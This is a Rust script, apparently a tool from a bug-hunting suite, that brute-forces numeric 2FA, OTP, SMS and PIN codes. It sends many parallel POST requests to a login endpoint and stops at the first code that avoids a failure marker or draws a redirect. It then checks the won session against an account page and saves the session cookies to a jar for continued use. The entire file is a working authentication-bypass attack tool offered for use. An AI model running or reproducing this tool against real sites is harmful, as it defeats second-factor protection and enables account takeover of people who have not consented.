#!/usr/bin/env rust-script
//! name: code_brute
//! description: 数字口令并行枚举件(OTP/2FA 安全码/短信码/PIN)- 对同一 POST 端点以 N 线程零填充枚举数字码,首命中即停;命中后自动带新会话复验 --confirm-path 并把 Set-Cookie 写回 jar,一个信封给出中码、状态、Location、确认页片段与尝试数
//! version: 1.0.0
//! args: <url> [--field mfa-code] [--len 4] [--start 0] [--end 9999] [--threads 16] [--jar PATH] [--header 'K: V']... [--form k=v]... [--fail-marker S] [--confirm-path /my-account] [--timeout-ms N] [--snippet N] [--selftest]
//! keywords: 漏洞猎手套件, 爆破, otp, mfa, 2fa, pin, brute, authentication, 安全码
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Cfg {
    url: String,
    field: String,
    len: usize,
    start: usize,
    end: usize,
    threads: usize,
    jar_path: Option<String>,
    headers: Vec<(String, String)>,
    forms: Vec<(String, String)>,
    fail_marker: String,
    confirm_path: Option<String>,
    timeout_ms: u64,
    snippet: usize,
}

struct Reply {
    status: u16,
    location: String,
    set_cookies: Vec<String>,
    body: String,
    transport_err: Option<String>,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        url: String::new(),
        field: "mfa-code".to_string(),
        len: 4,
        start: 0,
        end: 9999,
        threads: 16,
        jar_path: None,
        headers: Vec::new(),
        forms: Vec::new(),
        fail_marker: "Incorrect".to_string(),
        confirm_path: Some("/my-account".to_string()),
        timeout_ms: 20000,
        snippet: 240,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--field" => { i += 1; cfg.field = arg(&args, i); }
            "--len" => { i += 1; cfg.len = arg(&args, i).parse().unwrap_or(4); }
            "--start" => { i += 1; cfg.start = arg(&args, i).parse().unwrap_or(0); }
            "--end" => { i += 1; cfg.end = arg(&args, i).parse().unwrap_or(9999); }
            "--threads" => { i += 1; cfg.threads = arg(&args, i).parse().unwrap_or(16).max(1); }
            "--jar" => { i += 1; cfg.jar_path = Some(arg(&args, i)); }
            "--header" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once(':') {
                    cfg.headers.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--form" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once('=') {
                    cfg.forms.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--fail-marker" => { i += 1; cfg.fail_marker = arg(&args, i); }
            "--confirm-path" => { i += 1; cfg.confirm_path = Some(arg(&args, i)); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = arg(&args, i).parse().unwrap_or(20000); }
            "--snippet" => { i += 1; cfg.snippet = arg(&args, i).parse().unwrap_or(240); }
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.url.is_empty() {
        pi_rust_lib::report::failure(
            "code_brute",
            "missing url",
            "usage: code_brute <url> [--field mfa-code] [--len 4] [--end 9999] [--threads 16] [--jar PATH] [--form k=v] [--fail-marker S]",
        );
        std::process::exit(2);
    }
    if cfg.end < cfg.start {
        pi_rust_lib::report::failure("code_brute", "empty range: --end < --start", "swap the bounds and rerun");
        std::process::exit(2);
    }

    let mut jar: Jar = cfg.jar_path.as_deref().map(load_jar).unwrap_or_default();
    let cookie = cookie_header(&jar, &cfg.url);

    let hit_flag = Arc::new(AtomicBool::new(false));
    let next = Arc::new(AtomicUsize::new(cfg.start));
    let attempts = Arc::new(AtomicUsize::new(0));
    let transport_errors = Arc::new(AtomicUsize::new(0));
    let hist: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let found: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));

    let started = Instant::now();
    let url = Arc::new(cfg.url.clone());
    let field = Arc::new(cfg.field.clone());
    let forms = Arc::new(cfg.forms.clone());
    let headers = Arc::new(cfg.headers.clone());
    let cookie = Arc::new(cookie);
    let fail_marker = Arc::new(cfg.fail_marker.clone());

    let mut handles = Vec::new();
    for _ in 0..cfg.threads {
        // No redirect following: the 302 that carries the authenticated session
        // cookie must be read raw, otherwise the cookie is lost and the oracle
        // reads a followed login page instead.
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_millis(cfg.timeout_ms))
            .redirects(0)
            .build();
        let hit_flag = hit_flag.clone();
        let next = next.clone();
        let attempts = attempts.clone();
        let transport_errors = transport_errors.clone();
        let hist = hist.clone();
        let found = found.clone();
        let url = url.clone();
        let field = field.clone();
        let forms = forms.clone();
        let headers = headers.clone();
        let cookie = cookie.clone();
        let fail_marker = fail_marker.clone();
        let len = cfg.len;
        let end = cfg.end;
        let snippet = cfg.snippet;
        handles.push(std::thread::spawn(move || loop {
            if hit_flag.load(Ordering::SeqCst) {
                break;
            }
            let n = next.fetch_add(1, Ordering::SeqCst);
            if n > end {
                break;
            }
            let code = pad(n, len);
            attempts.fetch_add(1, Ordering::SeqCst);
            let reply = send(&agent, &url, &field, &forms, &headers, &cookie, &code, snippet);
            if let Some(e) = &reply.transport_err {
                transport_errors.fetch_add(1, Ordering::SeqCst);
                if let Ok(mut h) = hist.lock() {
                    *h.entry(format!("transport/{e}")).or_insert(0) += 1;
                }
                continue;
            }
            if let Ok(mut h) = hist.lock() {
                *h.entry(reply.status.to_string()).or_insert(0) += 1;
            }
            if is_hit(reply.status, &reply.body, fail_marker.as_str()) {
                hit_flag.store(true, Ordering::SeqCst);
                let record = json!({
                    "code": code,
                    "status": reply.status,
                    "location": reply.location,
                    "set_cookie": reply.set_cookies.iter().map(|c| c.split('=').next().unwrap_or("").to_string()).collect::<Vec<_>>(),
                    "body_len": reply.body.len(),
                    "snippet": collapse(&reply.body, snippet),
                });
                if let Ok(mut slot) = found.lock() {
                    if slot.is_none() {
                        *slot = Some(record);
                    }
                }
                // keep the winning set-cookies for the confirm leg
                if let Ok(mut slot) = found.lock() {
                    if let Some(obj) = slot.as_mut().and_then(|v| v.as_object_mut()) {
                        obj.insert("set_cookie_raw".to_string(), json!(reply.set_cookies));
                    }
                }
                break;
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let elapsed_ms = started.elapsed().as_millis() as u64;

    let hit = found.lock().ok().and_then(|s| s.clone());
    let histogram: Vec<Value> = hist
        .lock()
        .map(|h| h.iter().map(|(k, c)| json!({"response": k, "count": c})).collect())
        .unwrap_or_default();

    let mut confirm = Value::Null;
    let mut jar_updated = false;
    if let Some(h) = &hit {
        let raw: Vec<String> = h
            .get("set_cookie_raw")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
            .unwrap_or_default();
        let winner: Vec<(String, String)> = raw.iter().filter_map(|c| split_cookie(c)).collect();
        if let (Some(path), Some(jar_path)) = (cfg.confirm_path.as_deref(), cfg.jar_path.as_deref()) {
            let mut confirm_cookies = cookie_header(&jar, &cfg.url);
            for (k, v) in &winner {
                if !confirm_cookies.is_empty() {
                    confirm_cookies.push_str("; ");
                }
                confirm_cookies.push_str(&format!("{k}={v}"));
            }
            let target = match Url::parse(&cfg.url) {
                Ok(mut u) => {
                    u.set_path(path);
                    u.set_query(None);
                    u.to_string()
                }
                Err(_) => format!("{}{}", trim_slash(&cfg.url), path),
            };
            let agent = ureq::AgentBuilder::new()
                .timeout(Duration::from_millis(cfg.timeout_ms))
                .redirects(2)
                .build();
            let reply = get(&agent, &target, &confirm_cookies, &cfg.headers, cfg.snippet);
            confirm = json!({
                "path": path,
                "url": target,
                "status": reply.status,
                "location": reply.location,
                "snippet": collapse(&reply.body, cfg.snippet),
                "set_cookie": reply.set_cookies.iter().map(|c| c.split('=').next().unwrap_or("").to_string()).collect::<Vec<_>>(),
            });
            if apply_setcookies(&mut jar, &cfg.url, &winner) {
                if let Ok(text) = pi_rust_lib::serde_json::to_string(&jar) {
                    if std::fs::write(jar_path, text).is_ok() {
                        jar_updated = true;
                    }
                }
            }
        }
    }

    let data = json!({
        "url": cfg.url,
        "field": cfg.field,
        "range": format!("{}-{}", cfg.start, cfg.end),
        "code_len": cfg.len,
        "threads": cfg.threads,
        "attempts": attempts.load(Ordering::SeqCst),
        "transport_errors": transport_errors.load(Ordering::SeqCst),
        "elapsed_ms": elapsed_ms,
        "status_histogram": histogram,
        "hit": hit,
        "confirm": confirm,
        "jar_updated": jar_updated,
    });
    let cta = if data["hit"].is_null() {
        "no code in range satisfied the oracle; widen --end/--len, fix --fail-marker/--form fields, or re-generate the target's code first"
    } else {
        "confirm status/snippet proves the account; keep going with the session written into the jar"
    };
    pi_rust_lib::report::success("code_brute", data, cta).expect("report success");
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn trim_slash(s: &str) -> &str {
    s.trim_end_matches('/')
}

/// zero-padded decimal code, e.g. pad(7, 4) == "0007"
fn pad(n: usize, len: usize) -> String {
    let s = n.to_string();
    if s.len() >= len {
        s
    } else {
        format!("{}{}", "0".repeat(len - s.len()), s)
    }
}

fn build_body(forms: &[(String, String)], field: &str, code: &str) -> String {
    let mut parts: Vec<String> = forms.iter().map(|(k, v)| format!("{k}={v}")).collect();
    parts.push(format!("{field}={code}"));
    parts.join("&")
}

/// A 3xx after the code POST is the success redirect; otherwise success is the
/// absence of the failure marker in the rendered page.
fn is_hit(status: u16, body: &str, fail_marker: &str) -> bool {
    if (300..400).contains(&status) {
        return true;
    }
    !fail_marker.is_empty() && !body.contains(fail_marker)
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn split_cookie(raw: &str) -> Option<(String, String)> {
    let first = raw.split(';').next()?.trim();
    let (k, v) = first.split_once('=')?;
    Some((k.trim().to_string(), v.trim().to_string()))
}

fn send(
    agent: &ureq::Agent,
    url: &str,
    field: &str,
    forms: &[(String, String)],
    headers: &[(String, String)],
    cookie: &str,
    code: &str,
    snippet: usize,
) -> Reply {
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    for (k, v) in headers {
        req = req.set(k, v);
    }
    match req.send_string(&build_body(forms, field, code)) {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r, snippet),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn get(agent: &ureq::Agent, url: &str, cookie: &str, headers: &[(String, String)], snippet: usize) -> Reply {
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    for (k, v) in headers {
        req = req.set(k, v);
    }
    match req.call() {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r, snippet),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn read(r: ureq::Response, _snippet: usize) -> Reply {
    let status = r.status();
    let location = r.header("Location").unwrap_or("").to_string();
    let set_cookies: Vec<String> = r.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = r.into_string().unwrap_or_default();
    Reply {
        status,
        location,
        set_cookies,
        body,
        transport_err: None,
    }
}

fn host_of(url: &str) -> String {
    Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default()
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = host_of(url);
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn apply_setcookies(jar: &mut Jar, url: &str, pairs: &[(String, String)]) -> bool {
    if pairs.is_empty() {
        return false;
    }
    let host = host_of(url);
    let key = jar
        .keys()
        .find(|h| **h == host || host.ends_with(&format!(".{h}")) || h.ends_with(&host))
        .cloned()
        .unwrap_or(host);
    let entry = jar.entry(key).or_default();
    for (k, v) in pairs {
        entry.insert(k.clone(), v.clone());
    }
    true
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| pi_rust_lib::serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let forms = vec![("csrf".to_string(), "tok".to_string())];
    let body = build_body(&forms, "mfa-code", "0042");
    let pad_ok = pad(7, 4) == "0007" && pad(12345, 4) == "12345";
    let body_ok = body == "csrf=tok&mfa-code=0042";
    let hit_ok = is_hit(302, "", "Incorrect")
        && !is_hit(200, "Incorrect security code", "Incorrect")
        && is_hit(200, "Please enter your 4-digit security code", "Incorrect");
    let mut jar: Jar = BTreeMap::new();
    jar.insert(
        "lab.example.net".to_string(),
        [("session".to_string(), "abc".to_string())].into_iter().collect(),
    );
    let ch = cookie_header(&jar, "https://lab.example.net/login2");
    let ch_ok = ch == "session=abc";
    let applied = apply_setcookies(&mut jar, "https://lab.example.net/login2", &[("session".into(), "new".into())]);
    let jar_ok = applied && jar["lab.example.net"]["session"] == "new";
    let split_ok = split_cookie("session=zz; Secure; HttpOnly") == Some(("session".to_string(), "zz".to_string()));
    let collapse_ok = collapse("a\n  b", 10) == "a b";
    let receipt = pad_ok && body_ok && hit_ok && ch_ok && jar_ok && split_ok && collapse_ok;
    let data = json!({
        "selftest": if receipt {"ok"} else {"fail"},
        "pad": pad_ok,
        "body": body_ok,
        "oracle": hit_ok,
        "cookie_header": ch_ok,
        "jar_writeback": jar_ok,
        "split_cookie": split_ok,
        "collapse": collapse_ok,
    });
    if receipt {
        pi_rust_lib::report::success("code_brute", data, "selftest passed; run against the target endpoint").expect("report");
    } else {
        pi_rust_lib::report::failure("code_brute", "selftest failed", "inspect pad/body/oracle/jar assertions");
        std::process::exit(1);
    }
}
